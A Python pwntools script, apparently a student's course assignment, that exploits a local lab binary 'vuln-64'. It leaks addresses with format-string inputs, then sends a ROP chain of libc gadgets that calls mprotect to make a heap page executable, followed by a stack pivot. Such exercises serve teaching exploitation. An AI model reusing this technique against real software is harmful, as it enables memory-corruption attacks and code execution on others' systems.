# Maximiliano brizzio
# I pledge my honor that I have abided by the Stevens Honor System.


from pwn import *
import time

context(os='linux', arch='amd64')
io = process('./vuln-64')

#win address offset
win_offset = 331

#gets return address of vuln_func
io.sendline(b'%11$p')
vfunc_ret_addr = int(io.recvline(), 16)


#getting mprotect address and setting up overflow string
libc = io.libs()['/usr/lib/x86_64-linux-gnu/libc.so.6']

mprotect = libc + 0x1010f0

buf_fp_offset = 136

oflow1 = b'A' * buf_fp_offset

#ROP Gadgets
pop_rdi = libc + 0x27c65
pop_rsi = libc + 0x29419
pop_rdx = libc + 0xfd6bd

#stack pivot gadget calculation
#vfunc_ret_gdb = 0x00005555555552ab
#stack_piv_gdb = 0x00005555555552d6
#win_gdb =       0x0000555555555189
# win offset =   331 (290 + 41)
# win offset = 2 ( 43 - 41)

stack_piv_offset = 2
stack_pivot = vfunc_ret_addr + stack_piv_offset

io.recvline()
io.recvline()
io.sendline(b'%5$p')
heap_page = int(io.recvline()[:-4] + b'000', 16)

rdi = heap_page
rsi = 4096
rdx = 7

print("libc: ", hex(libc))
print("stack_pivot: ", hex(stack_pivot))
print("pop rdi: ", hex(pop_rdi))
print("pop rsi: ", hex(pop_rsi))
print("pop rdx: ", hex(pop_rdx))
print("mprotect: ", hex(mprotect))


#creating payload
offset = b'A' * 80
exploit = bytearray(pop_rdi.to_bytes(8, byteorder='little'))
exploit.extend(rdi.to_bytes(8, byteorder='little'))
exploit.extend(pop_rsi.to_bytes(8, byteorder='little'))
exploit.extend(rsi.to_bytes(8, byteorder='little'))
exploit.extend(pop_rdx.to_bytes(8, byteorder='little'))
exploit.extend(rdx.to_bytes(8, byteorder='little'))
exploit.extend(mprotect.to_bytes(8, byteorder='little'))
exploit.extend(vfunc_ret_addr.to_bytes(8, byteorder='little'))
exploit.extend(offset)
exploit.extend(stack_pivot.to_bytes(8, byteorder='little'))


print("payload: ", exploit)
io.recvline()
io.recvline()
io.sendline(exploit)
time.sleep(1)

io.sendline(b'')
print(io.recvline())

io.close()
